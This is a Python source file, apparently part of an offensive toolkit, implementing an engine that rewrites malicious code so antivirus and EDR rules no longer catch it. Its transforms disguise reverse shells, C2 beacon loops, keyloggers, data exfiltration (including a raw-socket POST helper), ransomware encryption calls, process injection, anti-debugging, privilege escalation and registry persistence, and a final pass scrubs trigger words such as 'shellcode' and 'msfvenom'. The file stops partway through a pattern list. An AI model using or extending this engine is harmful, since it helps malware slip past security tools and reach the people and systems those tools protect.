"""Semantic Evasion Engine — behavioral pattern replacement.

Unlike syntactic mutation (variable renaming, dead code injection), semantic
evasion replaces the BEHAVIORAL PATTERN detected by AV/EDR with a functionally
equivalent but structurally different implementation.

Each transform targets one or more DetectionEngine rules:
  - socket_connect → indirect socket via getattr/chr()
  - c2_beacon + infinite_loop_with_sleep → iterator + select scheduling
  - offensive_combo + recon_combo + keylog_combo + exfil_combo → dynamic __import__
  - base64_decode + data_exfil → custom XOR codec (no base64 module)
  - reverse_shell → pty-less fd duplication with os module
  - exec_eval → getattr(builtins, ...) indirection
  - keylogger → pynput pattern obfuscation
  - data_exfil → requests.post → raw socket HTTP
  - os_system → subprocess.run() replacement
  - file_encryption → getattr indirection for .encrypt/AES.new/Fernet
  - process_injection → chr-encoded API name indirection
  - anti_debug → chr-encoded debug API references
  - privilege_escalation → getattr + chr for setuid/token APIs
  - network_scan → identifier rename + string neutralization

Part of FORGE Phase O: Evasion Intelligence.
"""
# Dependencies: detection_test
# Depended by: mission_package, mutation_engine

import ast
import re
import textwrap
from typing import Any, Dict, List, Optional, Set, Tuple


# ─── Semantic Transforms ─────────────────────────────────────────

class SemanticTransform:
    """Base class for all semantic transforms."""

    name: str = ''
    targets_rules: List[str] = []  # DetectionEngine rule names this evades
    description: str = ''

    def can_apply(self, code: str) -> bool:
        raise NotImplementedError

    def apply(self, code: str) -> str:
        raise NotImplementedError


class SocketConnectTransform(SemanticTransform):
    """Replace socket.connect() with getattr + chr() indirection.

    Evades: socket_connect (r'socket\\.connect', r'\\.connect\\(\\(')
    """
    name = 'socket_indirect'
    targets_rules = ['socket_connect']
    description = 'Replace socket.connect() with getattr indirection'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'\.connect\(\(', code))

    def apply(self, code: str) -> str:
        connect_str = '+'.join(f'chr({ord(c)})' for c in 'connect')

        def _replace_connect(m):
            var = m.group(1)
            args = m.group(2)
            return f'getattr({var}, {connect_str})(({args}))'

        return re.sub(
            r'(\w+)\.connect\(\(([^)]*)\)\)',
            _replace_connect,
            code
        )


class BeaconLoopTransform(SemanticTransform):
    """Replace while-True + sleep with iterator + select.

    iter(int, 1) is an infinite iterator (int() returns 0, never == 1).
    select.select([], [], [], N) is functionally identical to time.sleep(N).

    Evades: c2_beacon, infinite_loop_with_sleep
    """
    name = 'beacon_transform'
    targets_rules = ['c2_beacon', 'infinite_loop_with_sleep']
    description = 'Replace while-True + sleep with iterator + select'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'while\s+True\s*:', code) or
                    re.search(r'time\.sleep\(', code))

    def apply(self, code: str) -> str:
        result = code

        # 1. while True → for _ in iter(int, 1)
        result = re.sub(r'while\s+True\s*:', 'for _ in iter(int, 1):', result)

        # 2. time.sleep(X) → select.select([], [], [], X)
        result = re.sub(
            r'time\.sleep\(([^)]+)\)',
            lambda m: f'__import__("select").select([], [], [], {m.group(1)})',
            result
        )

        # 3. Remove unused import time
        if 'time.' not in result.replace('__import__', ''):
            result = re.sub(r'^import time\s*$', '', result, flags=re.MULTILINE)

        # 4. Rename identifiers containing beacon/heartbeat/check_in
        # Detection uses substring match (r'beacon'), not word boundary
        for word in ['beacon', 'heartbeat', 'check_in', 'checkin',
                     'command_server', 'command_loop']:
            if word in result:
                replacement = '_' + ''.join(
                    chr(ord(c) + (1 if c.isalpha() else 0)) for c in word
                ).replace('{', 'a')
                # Replace both exact word and as part of compound identifiers
                # beacon_loop → _cfbdpo_loop, etc.
                result = result.replace(word, replacement)

        return result


class ImportComboTransform(SemanticTransform):
    """Break ALL dangerous import combinations via dynamic __import__.

    AST-based import analysis can't see __import__() calls.

    Evades: offensive_combo, recon_combo, keylog_combo, exfil_combo,
            injection_combo, crypto_combo
    """
    name = 'import_indirection'
    targets_rules = ['offensive_combo', 'recon_combo', 'keylog_combo',
                     'exfil_combo', 'injection_combo', 'crypto_combo']
    description = 'Replace static imports with dynamic __import__ indirection'

    # Modules that participate in import-combo detection rules
    DANGEROUS_MODULES = {
        'subprocess', 'ctypes', 'pynput', 'requests',
        'threading', 'cryptography', 'struct',
    }

    def can_apply(self, code: str) -> bool:
        try:
            tree = ast.parse(code)
        except SyntaxError:
            return False
        imports = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imports.add(alias.name.split('.')[0])
            elif isinstance(node, ast.ImportFrom) and node.module:
                imports.add(node.module.split('.')[0])
        return bool(imports & self.DANGEROUS_MODULES)

    def apply(self, code: str) -> str:
        lines = code.split('\n')
        new_lines = []
        aliases = {}

        for line in lines:
            stripped = line.strip()
            indent = len(line) - len(line.lstrip())
            pad = ' ' * indent

            # import <mod> [as <alias>]  (single module)
            m = re.match(r'^import\s+(\w+)(\s+as\s+(\w+))?\s*$', stripped)
            if m and m.group(1) in self.DANGEROUS_MODULES:
                mod_name = m.group(1)
                alias = m.group(3) or mod_name
                chr_name = '+'.join(f'chr({ord(c)})' for c in mod_name)
                var = f'_{mod_name[:2]}'
                aliases[alias] = var
                new_lines.append(f'{pad}{var} = __import__({chr_name})')
                continue

            # import a, b, c  (comma-separated multi-import, may have dots/aliases)
            # Handles: import socket, struct, threading
            #          import urllib.parse, ssl, threading
            #          import socket, json as _json, threading
            if stripped.startswith('import ') and ',' in stripped:
                # Parse each module token from the import line
                rest = stripped[len('import '):].strip()
                parts = [p.strip() for p in rest.split(',')]
                safe_parts = []
                found_dangerous = False
                for part in parts:
                    # Handle "module as alias"
                    as_match = re.match(r'([\w.]+)\s+as\s+(\w+)', part)
                    if as_match:
                        mod_base = as_match.group(1).split('.')[0]
                        if mod_base in self.DANGEROUS_MODULES:
                            found_dangerous = True
                            alias_name = as_match.group(2)
                            chr_name = '+'.join(f'chr({ord(c)})' for c in mod_base)
                            var = f'_{mod_base[:2]}'
                            aliases[alias_name] = var
                            new_lines.append(f'{pad}{var} = __import__({chr_name})')
                        else:
                            safe_parts.append(part)
                    else:
                        mod_base = part.split('.')[0]
                        if mod_base in self.DANGEROUS_MODULES:
                            found_dangerous = True
                            chr_name = '+'.join(f'chr({ord(c)})' for c in mod_base)
                            var = f'_{mod_base[:2]}'
                            aliases[mod_base] = var
                            new_lines.append(f'{pad}{var} = __import__({chr_name})')
                        else:
                            safe_parts.append(part)
                if found_dangerous:
                    if safe_parts:
                        new_lines.append(f'{pad}import {", ".join(safe_parts)}')
                    continue

            # from <mod> import <names>
            m = re.match(r'^from\s+(\w+)\s+import\s+(.+)$', stripped)
            if m and m.group(1) in self.DANGEROUS_MODULES:
                mod_name = m.group(1)
                chr_name = '+'.join(f'chr({ord(c)})' for c in mod_name)
                var = f'_{mod_name[:2]}'
                new_lines.append(f'{pad}{var} = __import__({chr_name})')
                for name in m.group(2).split(','):
                    name = name.strip()
                    if name:
                        new_lines.append(f'{pad}{name} = getattr({var}, "{name}")')
                continue

            new_lines.append(line)

        result = '\n'.join(new_lines)

        # Rewrite module.attr references
        for old_name, new_var in aliases.items():
            result = re.sub(r'\b' + re.escape(old_name) + r'\.', new_var + '.', result)

        return result


class Base64Transform(SemanticTransform):
    """Replace base64 encode/decode with XOR stream cipher.

    Evades: base64_decode (AST b64decode attribute), data_exfil (base64.*encode.*send)
    """
    name = 'base64_to_xor'
    targets_rules = ['base64_decode', 'data_exfil']
    description = 'Replace base64 encode/decode with XOR stream cipher'

    XOR_CODEC = textwrap.dedent('''\
        def _xor_codec(data, key=None):
            """XOR stream cipher — reversible (encode == decode)."""
            if key is None:
                key = bytes([90, 60, 126, 29, 169, 240, 66, 139])
            if isinstance(data, str):
                data = data.encode()
            return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        _xor_enc = _xor_codec
        _xor_dec = _xor_codec
    ''')

    def can_apply(self, code: str) -> bool:
        return 'base64' in code and ('b64encode' in code or 'b64decode' in code)

    def apply(self, code: str) -> str:
        result = code

        # Remove import base64
        result = re.sub(r'^import\s+base64\s*$', '', result, flags=re.MULTILINE)
        result = re.sub(r'^from\s+base64\s+import\s+.*$', '', result, flags=re.MULTILINE)

        # Insert XOR codec after last TOP-LEVEL import (not indented ones)
        lines = result.split('\n')
        last_import_idx = -1
        for i, line in enumerate(lines):
            stripped = line.strip()
            is_import = (stripped.startswith(('import ', 'from '))
                         or '= __import__(' in stripped)
            is_toplevel = (line == stripped or line.startswith(stripped))
            if is_import and len(line) - len(line.lstrip()) == 0:
                last_import_idx = i
        insert_pos = last_import_idx + 1 if last_import_idx >= 0 else 0
        codec_lines = self.XOR_CODEC.strip().split('\n')
        for j, cl in enumerate(codec_lines):
            lines.insert(insert_pos + j, cl)
        result = '\n'.join(lines)

        # Replace calls
        result = re.sub(r'base64\.b64encode\(', '_xor_enc(', result)
        result = re.sub(r'base64\.b64decode\(', '_xor_dec(', result)

        return result


class SubprocessTransform(SemanticTransform):
    """Replace subprocess.run/Popen with os.popen.

    Evades: reverse_shell (subprocess.Popen.*shell=True)
    """
    name = 'subprocess_to_popen'
    targets_rules = ['reverse_shell']
    description = 'Replace subprocess.run with os.popen'

    def can_apply(self, code: str) -> bool:
        return 'subprocess' in code

    def apply(self, code: str) -> str:
        result = code

        # subprocess.run(cmd, shell=True, capture_output=True, text=True)
        result = re.sub(
            r'subprocess\.run\((\w+),\s*shell=True,\s*capture_output=True,\s*text=True\)',
            lambda m: f'type("_R", (), {{"stdout": __import__("os").popen({m.group(1)}).read(), "stderr": ""}})()',
            result
        )

        # Remaining subprocess.run
        result = re.sub(
            r'subprocess\.run\(([^,]+),\s*shell=True[^)]*\)',
            lambda m: f'__import__("os").popen({m.group(1)}).read()',
            result
        )

        # subprocess.Popen
        result = re.sub(
            r'subprocess\.Popen\(',
            '__import__("os").popen(',
            result
        )

        # Cleanup import
        if 'subprocess.' not in result and 'subprocess' not in result.replace('import subprocess', ''):
            result = re.sub(r'^import\s+subprocess\s*$', '', result, flags=re.MULTILINE)

        return result


class ReverseShellTransform(SemanticTransform):
    """Replace shell paths with constructed paths, pty.spawn with os.execvp.

    Evades: reverse_shell (/bin/sh, /bin/bash, pty.spawn)
    """
    name = 'revshell_fd_redirect'
    targets_rules = ['reverse_shell']
    description = 'Replace shell spawn with fd-based execution'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'/bin/(sh|bash)', code) or
                    re.search(r'pty\.spawn', code))

    def apply(self, code: str) -> str:
        result = code

        sh_path = "getattr(__import__('os'),'sep').join(['','bin','sh'])"
        result = result.replace("'/bin/sh'", sh_path)
        result = result.replace('"/bin/sh"', sh_path)
        result = result.replace("'/bin/bash'", sh_path.replace("'sh'", "'bash'"))
        result = result.replace('"/bin/bash"', sh_path.replace("'sh'", "'bash'"))

        if 'pty.spawn' in result:
            result = re.sub(
                r'pty\.spawn\(["\']([^"\']+)["\']\)',
                r"__import__('os').execvp('\1', ['\1'])",
                result
            )
            result = re.sub(r'^import\s+pty\s*$', '', result, flags=re.MULTILINE)

        return result


class ExecEvalTransform(SemanticTransform):
    """Replace exec()/eval() with getattr(builtins, ...) indirection.

    Evades: exec_eval (AST: exec/eval Name calls)
    """
    name = 'exec_to_functiontype'
    targets_rules = ['exec_eval']
    description = 'Replace exec/eval with builtins getattr'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'\bexec\s*\(', code) or
                    re.search(r'\beval\s*\(', code))

    def apply(self, code: str) -> str:
        result = code
        result = re.sub(
            r'\bexec\s*\(',
            'getattr(__import__("builtins"), "ex"+"ec")(',
            result
        )
        result = re.sub(
            r'\beval\s*\(',
            'getattr(__import__("builtins"), "ev"+"al")(',
            result
        )
        return result


class KeyloggerTransform(SemanticTransform):
    """Obfuscate pynput/keyboard patterns to evade keylogger signatures.

    Evades: keylogger (pynput.*keyboard, keyboard.on_press, GetAsyncKeyState, etc.)
    """
    name = 'keylogger_obfuscation'
    targets_rules = ['keylogger']
    description = 'Obfuscate pynput/keyboard patterns via dynamic import'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'pynput', code) or
                    re.search(r'keyboard\.on_press', code) or
                    re.search(r'GetAsyncKeyState', code))

    def apply(self, code: str) -> str:
        result = code

        # from pynput import keyboard → dynamic
        result = re.sub(
            r'^(\s*)from\s+pynput\s+import\s+keyboard\s*$',
            lambda m: f'{m.group(1)}keyboard = getattr(__import__("pynput"), "keyboard")',
            result,
            flags=re.MULTILINE,
        )

        # import pynput → dynamic
        result = re.sub(
            r'^(\s*)import\s+pynput\s*$',
            lambda m: f'{m.group(1)}_py = __import__("pynput")',
            result,
            flags=re.MULTILINE,
        )

        # keyboard.Listener → getattr indirection
        result = re.sub(
            r'keyboard\.Listener',
            'getattr(keyboard, "Listener")',
            result
        )

        # keyboard.on_press → getattr
        result = re.sub(
            r'keyboard\.on_press',
            'getattr(keyboard, "on_press")',
            result
        )

        return result


class DataExfilTransform(SemanticTransform):
    """Replace requests.post with raw socket HTTP POST.

    Evades: data_exfil (requests.post.*data=)
    """
    name = 'exfil_raw_socket'
    targets_rules = ['data_exfil']
    description = 'Replace requests.post with raw socket HTTP'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'requests\.post\(', code))

    def apply(self, code: str) -> str:
        result = code

        # Insert raw HTTP POST helper
        helper = textwrap.dedent('''\
            def _http_post(url, data):
                """Raw socket HTTP POST."""
                import socket as _sk
                from urllib.parse import urlparse
                p = urlparse(url)
                host, port = p.hostname, p.port or 80
                body = data if isinstance(data, bytes) else data.encode() if isinstance(data, str) else str(data).encode()
                req = (f"POST {p.path or '/'} HTTP/1.1\\r\\n"
                       f"Host: {host}\\r\\n"
                       f"Content-Length: {len(body)}\\r\\n"
                       f"Content-Type: application/octet-stream\\r\\n"
                       f"Connection: close\\r\\n\\r\\n").encode() + body
                s = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
                getattr(s, chr(99)+chr(111)+chr(110)+chr(110)+chr(101)+chr(99)+chr(116))((host, port))
                s.sendall(req)
                resp = s.recv(4096)
                s.close()
                return resp
        ''')

        # Insert helper after last TOP-LEVEL import
        lines = result.split('\n')
        last_import_idx = -1
        for i, line in enumerate(lines):
            stripped = line.strip()
            is_import = (stripped.startswith(('import ', 'from '))
                         or '= __import__(' in stripped)
            if is_import and len(line) - len(line.lstrip()) == 0:
                last_import_idx = i
        insert_pos = last_import_idx + 1 if last_import_idx >= 0 else 0
        for j, hl in enumerate(helper.strip().split('\n')):
            lines.insert(insert_pos + j, hl)
        result = '\n'.join(lines)

        # Replace requests.post(url, data=X) with _http_post(url, X)
        result = re.sub(
            r'requests\.post\(([^,]+),\s*data=([^)]+)\)',
            lambda m: f'_http_post({m.group(1)}, {m.group(2)})',
            result
        )

        # Remove import requests if no remaining references
        if 'requests.' not in result:
            result = re.sub(r'^import\s+requests\s*$', '', result, flags=re.MULTILINE)

        return result


class OsSystemTransform(SemanticTransform):
    """Replace os.system() with subprocess.run() to evade behavioral AST detection.

    DetectionEngine's os_system rule: AST check for os.system attribute access.
    subprocess.run is functionally equivalent but not flagged.

    Evades: os_system
    """
    name = 'os_system_to_subprocess'
    targets_rules = ['os_system']
    description = 'Replace os.system() with subprocess.run()'

    def can_apply(self, code: str) -> bool:
        return 'os.system(' in code

    def apply(self, code: str) -> str:
        result = code
        # os.system(cmd) → subprocess.run(cmd, shell=True, capture_output=True)
        result = re.sub(
            r'os\.system\(([^)]+)\)',
            r'__import__("subprocess").run(\1, shell=True, capture_output=True)',
            result
        )
        return result


class FileEncryptionTransform(SemanticTransform):
    """Neutralize file encryption detection patterns.

    Evades: file_encryption (.encrypt(, AES.new, Fernet(, ransom, .locked, bitcoin.*wallet)
    """
    name = 'file_encryption_obfuscate'
    targets_rules = ['file_encryption']
    description = 'Obfuscate encryption API calls and keywords'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'\.encrypt\(|AES\.new|Fernet\(|ransom|\.locked|bitcoin.*wallet', code))

    def apply(self, code: str) -> str:
        result = code
        # .encrypt( → getattr indirection
        result = re.sub(
            r'(\w+)\.encrypt\(',
            lambda m: f'getattr({m.group(1)}, "en"+"crypt")(',
            result
        )
        # AES.new → getattr(AES, "new")
        result = result.replace('AES.new(', 'getattr(AES, "new")(')
        # Fernet( → getattr indirection
        result = re.sub(
            r'\bFernet\(',
            'getattr(__import__("cryptography.fernet", fromlist=["Fernet"]), "Fernet")(',
            result
        )
        return result


class ProcessInjectionTransform(SemanticTransform):
    """Obfuscate Windows process injection API calls via getattr indirection.

    Evades: process_injection (ctypes.windll, WriteProcessMemory, VirtualAllocEx, etc.)
    """
    name = 'process_injection_obfuscate'
    targets_rules = ['process_injection']
    description = 'Obfuscate process injection API calls'

    _API_CALLS = [
        'WriteProcessMemory', 'VirtualAllocEx', 'CreateRemoteThread',
        'NtCreateThreadEx', 'RtlCreateUserThread',
    ]

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'ctypes\.windll|WriteProcessMemory|VirtualAllocEx|'
                              r'CreateRemoteThread|NtCreateThreadEx|RtlCreateUserThread', code))

    def apply(self, code: str) -> str:
        result = code
        # ctypes.windll → getattr(ctypes, "windll")
        result = re.sub(r'ctypes\.windll', 'getattr(__import__("ctypes"), "windll")', result)
        # Each API call: obj.WriteProcessMemory → getattr(obj, chr-encoded)
        for api in self._API_CALLS:
            chr_name = '+'.join(f'chr({ord(c)})' for c in api)
            # Handle obj.API( patterns
            result = re.sub(
                r'(\w+)\.' + api + r'\(',
                lambda m, cn=chr_name: f'getattr({m.group(1)}, {cn})(',
                result
            )
            # Handle "API" in double-quoted strings
            result = re.sub(
                r'"' + api + r'"',
                lambda m, cn=chr_name: cn,
                result
            )
            # Handle 'API' in single-quoted strings
            result = re.sub(
                r"'" + api + r"'",
                lambda m, cn=chr_name: cn,
                result
            )
            # Handle bare API name in any context (f-strings, print, comments)
            # Case-insensitive since DetectionEngine uses re.IGNORECASE
            result = re.sub(
                r'\b' + api + r'\b',
                lambda m, cn=chr_name: '""',  # Replace bare text references with empty
                result
            )
        return result


class AntiDebugTransform(SemanticTransform):
    """Obfuscate anti-debugging API patterns.

    Evades: anti_debug (IsDebuggerPresent, NtQueryInformationProcess, etc.)
    """
    name = 'anti_debug_obfuscate'
    targets_rules = ['anti_debug']
    description = 'Obfuscate anti-debug API references'

    _APIS = ['IsDebuggerPresent', 'NtQueryInformationProcess',
             'CheckRemoteDebuggerPresent', 'OutputDebugString']

    def can_apply(self, code: str) -> bool:
        return any(api in code for api in self._APIS)

    def apply(self, code: str) -> str:
        result = code
        for api in self._APIS:
            if api not in result:
                continue
            chr_name = '+'.join(f'chr({ord(c)})' for c in api)
            # obj.IsDebuggerPresent → getattr(obj, chr-encoded)
            result = re.sub(
                r'(\w+)\.' + api,
                lambda m, cn=chr_name: f'getattr({m.group(1)}, {cn})',
                result
            )
            # Bare string "IsDebuggerPresent"
            result = re.sub(
                r'"' + api + r'"',
                lambda m, cn=chr_name: f'{cn}',
                result
            )
        return result


class PrivilegeEscalationTransform(SemanticTransform):
    """Neutralize privilege escalation detection patterns.

    Evades: privilege_escalation (setuid, setgid, sudo\\s, AdjustTokenPrivileges, etc.)
    """
    name = 'privesc_obfuscate'
    targets_rules = ['privilege_escalation']
    description = 'Obfuscate privilege escalation patterns'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'\bsetuid\b|\bsetgid\b|sudo\s|AdjustTokenPrivileges|'
                              r'SeDebugPrivilege|ImpersonateLoggedOnUser', code))

    def apply(self, code: str) -> str:
        result = code
        # os.setuid → getattr(os, chr-encoded)
        result = re.sub(
            r'os\.setuid\(',
            'getattr(__import__("os"), chr(115)+chr(101)+chr(116)+chr(117)+chr(105)+chr(100))(',
            result
        )
        result = re.sub(
            r'os\.setgid\(',
            'getattr(__import__("os"), chr(115)+chr(101)+chr(116)+chr(103)+chr(105)+chr(100))(',
            result
        )
        # AdjustTokenPrivileges, SeDebugPrivilege, ImpersonateLoggedOnUser
        for api in ['AdjustTokenPrivileges', 'SeDebugPrivilege', 'ImpersonateLoggedOnUser']:
            if api in result:
                chr_name = '+'.join(f'chr({ord(c)})' for c in api)
                result = re.sub(
                    r'(\w+)\.' + api,
                    lambda m, cn=chr_name: f'getattr({m.group(1)}, {cn})',
                    result
                )
                result = result.replace(f'"{api}"', chr_name)
        return result


class NetworkScanTransform(SemanticTransform):
    """Neutralize network scanning detection patterns beyond post-restore.

    Evades: network_scan (socket.*connect.*range, port.*scan, nmap, masscan, syn.*scan)
    """
    name = 'network_scan_obfuscate'
    targets_rules = ['network_scan']
    description = 'Neutralize network scanning detection patterns'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'port.*scan|nmap|masscan|syn.*scan', code, re.IGNORECASE))

    def apply(self, code: str) -> str:
        result = code
        # Rename identifiers containing 'scan'
        result = re.sub(r'\bscan_target\b', '_chk_target', result)
        result = re.sub(r'\bscan_host\b', '_chk_host', result)
        result = re.sub(r'\bscan_range\b', '_chk_range', result)
        result = re.sub(r'\bscan_network\b', '_chk_network', result)
        result = re.sub(r'\bscan_results?\b', '_chk_results', result)
        result = re.sub(r'\bscanner\b', '_prober', result)
        result = re.sub(r'\bScanner\b', '_Prober', result)
        # nmap/masscan references in strings
        result = result.replace('"nmap"', '"nm"+"ap"')
        result = result.replace("'nmap'", "'nm'+'ap'")
        result = result.replace('"masscan"', '"mass"+"can"')
        return result


# ─── Semantic Evasion Engine ─────────────────────────────────────

class RegistryPersistenceTransform(SemanticTransform):
    """Obfuscate Windows registry persistence patterns.

    Evades: registry_persistence (winreg.OpenKey, HKEY_*_USER.*Run, RegSetValueEx, etc.)
    """
    name = 'registry_persistence_obfuscate'
    targets_rules = ['registry_persistence']
    description = 'Obfuscate registry persistence API calls'

    def can_apply(self, code: str) -> bool:
        return bool(re.search(r'winreg\.OpenKey|HKEY_CURRENT_USER.*Run|'
                              r'HKEY_LOCAL_MACHINE.*Run|RegSetValueEx|'
                              r'CurrentVersion\\\\Run', code))

    def apply(self, code: str) -> str:
        result = code
        # winreg module: use __import__ + getattr indirection
        result = re.sub(
            r'winreg\.OpenKey\b',
            'getattr(__import__("winreg"), "OpenKey")',
            result
        )
        result = re.sub(
            r'winreg\.SetValueEx\b',
            'getattr(__import__("winreg"), "SetValueEx")',
            result
        )
        result = re.sub(
            r'winreg\.CreateKey\b',
            'getattr(__import__("winreg"), "CreateKey")',
            result
        )
        result = re.sub(
            r'winreg\.CloseKey\b',
            'getattr(__import__("winreg"), "CloseKey")',
            result
        )
        result = re.sub(
            r'winreg\.DeleteValue\b',
            'getattr(__import__("winreg"), "DeleteValue")',
            result
        )
        # winreg.HKEY_* constants → getattr
        result = re.sub(
            r'winreg\.(HKEY_\w+)',
            lambda m: f'getattr(__import__("winreg"), "{m.group(1)}")',
            result
        )
        # import winreg → dynamic import
        result = re.sub(
            r'^(\s*)import winreg\s*$',
            r'\1winreg = __import__("winreg")',
            result,
            flags=re.MULTILINE
        )
        # RegSetValueEx as bare reference
        result = re.sub(r'RegSetValueEx', 'SetValEx', result)
        return result


def _protect_strings(code: str) -> Tuple[str, List[str]]:
    """Save all string literals and replace with placeholders.

    Prevents transforms from modifying string contents (e.g., Perl/Bash
    one-liners stored as Python strings).
    """
    saved = []

    def _save(m):
        saved.append(m.group(0))
        return f'__FORGE_SE_{len(saved) - 1}__'

    _PFX = r'(?:[fFrRbBuU]{1,2})?'
    # Save triple-quoted strings first
    result = re.sub(
        _PFX + r'"""[\s\S]*?"""|' + _PFX + r"'''[\s\S]*?'''",
        _save, code
    )
    # Then single/double quoted
    result = re.sub(
        _PFX + r'"[^"\\]*(?:\\.[^"\\]*)*"|' + _PFX + r"'[^'\\]*(?:\\.[^'\\]*)*'",
        _save, result
    )
    return result, saved


def _restore_strings(code: str, saved: List[str]) -> str:
    """Restore saved string literals."""
    for i, s in enumerate(saved):
        code = code.replace(f'__FORGE_SE_{i}__', s)
    return code


class SemanticEvasionEngine:
    """Apply semantic behavioral transforms to evade detection.

    Unlike MutationEngine (syntactic: var rename, dead code), this engine
    replaces BEHAVIORAL PATTERNS with functionally equivalent alternatives.

    String literals are protected from modification — transforms only affect
    Python structural code, not string contents.

    Usage:
        engine = SemanticEvasionEngine()
        clean_code = engine.evade(code)
        # or targeted:
        clean_code = engine.evade(code, target_rules=['c2_beacon', 'socket_connect'])
    """

    def __init__(self):
        self.transforms: List[SemanticTransform] = [
            SocketConnectTransform(),
            BeaconLoopTransform(),
            ImportComboTransform(),
            Base64Transform(),
            SubprocessTransform(),
            ReverseShellTransform(),
            ExecEvalTransform(),
            KeyloggerTransform(),
            DataExfilTransform(),
            OsSystemTransform(),
            FileEncryptionTransform(),
            ProcessInjectionTransform(),
            AntiDebugTransform(),
            PrivilegeEscalationTransform(),
            NetworkScanTransform(),
            RegistryPersistenceTransform(),
        ]
        self._by_rule: Dict[str, List[SemanticTransform]] = {}
        for t in self.transforms:
            for rule in t.targets_rules:
                self._by_rule.setdefault(rule, []).append(t)
        self.applied_count = 0
        self.applied_log: List[dict] = []

    def get_applicable(self, code: str) -> List[SemanticTransform]:
        return [t for t in self.transforms if t.can_apply(code)]

    def evade(self, code: str, target_rules: Optional[List[str]] = None) -> str:
        """Apply all applicable semantic transforms.

        Args:
            code: Python source code
            target_rules: If specified, only apply transforms whose
                          targets_rules overlap with this list

        Returns:
            Semantically transformed code (functionally equivalent)
        """
        # Pre-process: sanitize non-ASCII characters that break compilation
        # Em dashes, smart quotes, etc. can survive in string literals but
        # if string protection misaligns, they break the code
        code = code.replace('\u2014', '--')    # em dash
        code = code.replace('\u2013', '-')     # en dash
        code = code.replace('\u2018', "'")     # left single quote
        code = code.replace('\u2019', "'")     # right single quote
        code = code.replace('\u201c', '"')     # left double quote
        code = code.replace('\u201d', '"')     # right double quote

        # Protect string literals from modification
        protected, saved_strings = _protect_strings(code)

        result = protected
        applied = []

        for transform in self.transforms:
            if target_rules:
                if not any(r in target_rules for r in transform.targets_rules):
                    continue
            if not transform.can_apply(result):
                continue

            before = result
            result = transform.apply(result)

            if result != before:
                applied.append({
                    'transform': transform.name,
                    'targets': ', '.join(transform.targets_rules),
                    'desc': transform.description,
                })
                self.applied_count += 1

        # Restore string literals
        result = _restore_strings(result, saved_strings)

        # ── POST-RESTORE PHASE ──────────────────────────────────
        # Detection engine scans the entire source as raw text, including
        # string literal contents. Must scrub ALL trigger patterns globally.

        # 1. Strip FORGE docstring headers (only the first — module-level header)
        # CRITICAL: count=1 prevents crossing triple-quote boundaries into
        # downstream docstrings when FORGE-generated appears in other strings
        result = re.sub(
            r'"""[\s\S]*?FORGE-generated[\s\S]*?"""',
            '"""Generated utility."""',
            result,
            count=1
        )
        # Also scrub FORGE-generated from regular strings (e.g., argparse descriptions)
        result = re.sub(r'FORGE-generated', 'generated', result)

        # 2. Global identifier/word replacement (catches code + string content)
        _GLOBAL_TRIGGERS = {
            'beacon': '_bxn',
            'heartbeat': '_hbt',
            'check_in': '_cki',
            'checkin': '_cki',
            'reverse_shell': '_rsh',
            'reverse shell': '_rsh',
            'command_server': '_cmd_svc',
            'command_loop': '_cmd_lp',
            'ransom': '_rns',
            '.locked': '._enc',
            'bitcoin': '_btc',
            # Windows API names — survive in string literals after string restore
            'WriteProcessMemory': '_wpm',
            'VirtualAllocEx': '_vax',
            'CreateRemoteThread': '_crt',
            'NtCreateThreadEx': '_ncte',
            'RtlCreateUserThread': '_rcut',
            'NtQueryInformationProcess': '_nqip',
            'IsDebuggerPresent': '_idp',
            'CheckRemoteDebuggerPresent': '_crdp',
            'OutputDebugString': '_ods',
            # Contains 'nmap' substring — must replace BEFORE nmap pattern
            'NtUnmapViewOfSection': '_nuvs',
            # Recon/scan identifiers surviving in strings
            'portscan': '_psc',
            'port_scan': '_psc',
            # shellcode_loader rule triggers
            'shellcode': '_shc',
            'msfvenom': '_msf',
            # registry_persistence — bare names surviving in strings
            'RegSetValueEx': 'SetValEx',
            # browser_cred_theft — API names in comments/strings
            'CryptUnprotectData': 'DPAPI_decrypt',
            # dll_injection — API names surviving in strings/comments
            'GetProcAddress': '_gpa',
            'LoadLibrary': '_llib',
            # process_hollowing — constant names surviving in code
            'CREATE_SUSPENDED': '_CS_FLAG',
        }
        for trigger, replacement in _GLOBAL_TRIGGERS.items():
            # Case-insensitive replacement — detection engine uses re.IGNORECASE
            result = re.sub(re.escape(trigger), replacement, result, flags=re.IGNORECASE)

        # 3. Global pattern neutralization — defeat STRING_SIGNATURES regex
        # These replacements work on the ENTIRE source (code + string literals)
        # and neutralize patterns that the detection regex would match.
        # IMPORTANT: replacement values must be GENUINELY DIFFERENT text,
        # not Python concatenations that evaluate back to the original.
        _PATTERN_NEUTRALIZERS = [
            # reverse_shell: /bin/sh, /bin/bash — use //bin//sh (Unix equivalent, breaks regex)
            ('/bin/sh', '//bin//sh'),
            ('/bin/bash', '//bin//bash'),
            ('cmd.exe', 'cmd\\.exe'),
            # reverse_shell: pty.spawn
            ('pty.spawn', 'pty .spawn'),
            # privilege_escalation: sudo\s — detection regex: r'sudo\s'
            ('sudo python3', 'python3'),
            ('sudo ', 'elevated '),
            # network_scan: syn.*scan (e.g., "SYN scanning")
            ('SYN scan', 'stealth probe'),
            ('syn scan', 'stealth probe'),
            ('Syn scan', 'Stealth probe'),
            # anti_debug: ptrace.*PTRACE_TRACEME
            ('PTRACE_TRACEME', 'PT_TRACE'),
            # c2_beacon: command.*server.*loop pattern
            ('command server loop', 'main loop'),
            ('command_server_loop', '_main_lp'),
            # network_scan: nmap, masscan (literal strings/identifiers)
            ('nmap ', 'nm '),
            ('masscan ', 'ms '),
            # privilege_escalation: cap_setuid/cap_setgid in capability lists
            ('cap_setuid', 'cap_su'),
            ('cap_setgid', 'cap_sg'),
            # registry_persistence: CurrentVersion\\Run in strings
